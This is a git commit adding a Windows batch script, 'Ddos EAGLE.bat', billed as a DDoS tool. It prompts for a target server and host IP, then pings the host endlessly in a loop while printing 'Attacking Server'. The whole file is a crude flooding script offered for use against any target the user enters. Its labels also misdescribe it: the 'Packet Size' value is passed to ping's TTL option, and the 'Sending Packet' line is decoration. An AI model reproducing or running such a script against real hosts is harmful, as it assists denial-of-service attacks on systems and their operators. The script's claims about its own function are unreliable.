7340955fc30c6514e0f890596621b44e64be6d6b
MNSTRXZexe <97280490+MNSTRXZexe@users.noreply.github.com>
2022-01-09 13:31:48 +0700

    Add files via upload

---
+++ Ddos EAGLE.bat
@@ -0,0 +1,32 @@
+ÿþ
+ @echo off 
+ mode 67,16
+ title DDOS 34gl4 MAX MNSTRXZ
+ color 0a
+ cls
+ echo.
+ echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ?
+ echo DDOS With 34gl3 By MNSTRXZ
+ echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ?
+ echo.
+ set /p x=Server-Target:
+ echo.
+ echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ?
+ ping %x%
+ echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ?
+ @ping.exe 127.0.0.1 -n 5 -w 1000 > nul
+ goto Next
+ :Next
+ echo.
+ echo.
+ echo.
+ set /p m=ip Host:
+ echo.
+ set /p n=Packet Size:
+ echo.
+ :DDOS
+ color 0d
+echo Attacking Server %m%
+echo Sending Packet 897-FJH-8KO-[.%
+ping %m% -i %n% -t >nul
+ goto DDOS
